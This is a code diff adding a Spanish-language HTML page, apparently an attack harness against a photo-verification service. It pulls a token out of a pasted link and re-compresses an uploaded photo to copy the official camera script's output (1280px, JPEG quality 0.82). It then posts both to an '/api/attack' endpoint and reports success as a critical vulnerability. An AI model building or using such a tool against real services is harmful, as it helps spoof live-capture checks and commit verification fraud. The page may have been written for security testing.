@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Prueba de Sistema</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      margin: 40px;
+      background-color: #121212;
+      color: #e0e0e0;
+    }
+    .container {
+      max-width: 500px;
+      margin: 0 auto;
+      background-color: #1e1e1e;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+    }
+    .form-group {
+      margin-bottom: 15px;
+    }
+    label {
+      display: block;
+      margin-bottom: 5px;
+      color: #bbb;
+    }
+    input[type="text"] {
+      width: 100%;
+      padding: 10px;
+      box-sizing: border-box;
+      background-color: #2c2c2c;
+      border: 1px solid #444;
+      color: #fff;
+      border-radius: 4px;
+    }
+    input[type="file"] {
+      color: #bbb;
+    }
+    button {
+      padding: 12px 15px;
+      cursor: pointer;
+      width: 100%;
+      background-color: #3b82f6;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-weight: bold;
+    }
+    button:hover {
+      background-color: #2563eb;
+    }
+    button:disabled {
+      background-color: #555;
+      color: #888;
+      cursor: not-allowed;
+    }
+    .console {
+      margin-top: 24px;
+      background: #000;
+      border-radius: 6px;
+      padding: 16px;
+      font-family: monospace;
+      color: #22c55e;
+      min-height: 100px;
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+    .console.error {
+      color: #ef4444;
+    }
+    .console.warning {
+      color: #eab308;
+    }
+    .preview {
+      margin-top: 10px;
+      max-width: 150px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h2>Prueba</h2>
+
+    <div class="form-group">
+      <label for="linkInput">Enlace</label>
+      <input type="text" id="linkInput" placeholder="URL">
+    </div>
+
+    <div class="form-group">
+      <label for="fileInput">Foto</label>
+      <input type="file" id="fileInput" accept="image/png, image/jpeg">
+      <img id="imagePreview" class="preview" alt="Vista previa">
+    </div>
+
+    <button id="attackBtn">Enviar Prueba</button>
+
+    <div id="consoleOutput" class="console">Listo.</div>
+  </div>
+
+  <script>
+    const linkInput = document.getElementById('linkInput');
+    const fileInput = document.getElementById('fileInput');
+    const imagePreview = document.getElementById('imagePreview');
+    const attackBtn = document.getElementById('attackBtn');
+    const consoleOutput = document.getElementById('consoleOutput');
+
+    let base64Image = null;
+
+    // Función idéntica a la del script oficial para clonar la compresión
+    function canvasToDownscaledDataURL(sourceCanvas, maxSide, quality) {
+      const w = sourceCanvas.width;
+      const h = sourceCanvas.height;
+      const maxDim = Math.max(w, h);
+      if (maxDim <= maxSide) {
+        return sourceCanvas.toDataURL('image/jpeg', quality);
+      }
+      const scale = maxSide / maxDim;
+      const nw = Math.round(w * scale);
+      const nh = Math.round(h * scale);
+      const tmp = document.createElement('canvas');
+      tmp.width = nw;
+      tmp.height = nh;
+      const tctx = tmp.getContext('2d');
+      tctx.drawImage(sourceCanvas, 0, 0, w, h, 0, 0, nw, nh);
+      return tmp.toDataURL('image/jpeg', quality);
+    }
+
+    fileInput.addEventListener('change', function(e) {
+      const file = e.target.files[0];
+      if (file) {
+        const reader = new FileReader();
+        reader.onload = function(event) {
+          const img = new Image();
+          img.onload = function() {
+            // Dibujamos la foto subida en un canvas invisible
+            const canvas = document.createElement('canvas');
+            canvas.width = img.width;
+            canvas.height = img.height;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(img, 0, 0);
+            
+            // LA CLONACIÓN: Convertimos a JPEG con 1280px y 0.82 de calidad
+            base64Image = canvasToDownscaledDataURL(canvas, 1280, 0.82);
+            
+            imagePreview.src = base64Image;
+            imagePreview.style.display = 'block';
+            logMessage('[INFO] Foto procesada a formato JPEG (1280px, 0.82) para imitar la cámara oficial.', 'warning');
+          };
+          img.src = event.target.result;
+        }
+        reader.readAsDataURL(file);
+      }
+    });
+
+    function logMessage(msg, type = '') {
+      consoleOutput.className = 'console ' + type;
+      consoleOutput.textContent = msg + '\n' + consoleOutput.textContent;
+    }
+
+    attackBtn.addEventListener('click', async () => {
+      const link = linkInput.value.trim();
+      if (!link || !base64Image) {
+        logMessage('[ERROR] Faltan datos.', 'warning');
+        return;
+      }
+
+      let token = '';
+      try {
+        const url = new URL(link);
+        token = url.searchParams.get('token');
+        if (!token) throw new Error('No token');
+      } catch (e) {
+        logMessage('[ERROR] Error en enlace.', 'warning');
+        return;
+      }
+
+      logMessage('Enviando petición HTTP directa...');
+      attackBtn.disabled = true;
+
+      try {
+        const response = await fetch('/api/attack', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            token: token,
+            foto: base64Image
+          })
+        });
+
+        const data = await response.json();
+        
+        if (data.status === 200 && (data.body.trim() === '1' || data.body.includes('"codigo":1') || data.body.includes('ok":true'))) {
+          logMessage(`\n[VULNERABILIDAD CRÍTICA] ¡Ataque exitoso!`);
+          logMessage(`Status: ${data.status} - Body: ${data.body}`, 'error');
+        } else {
+          logMessage(`\n[BLOQUEADO] El servidor rechazó la foto.`);
+          logMessage(`Status: ${data.status} - Body: ${data.body}`, 'warning');
+        }
+      } catch (err) {
+        logMessage(`[ERROR] ${err.message}`, 'error');
+      } finally {
+        attackBtn.disabled = false;
+      }
+    });
+  </script>
+</body>
+</html>
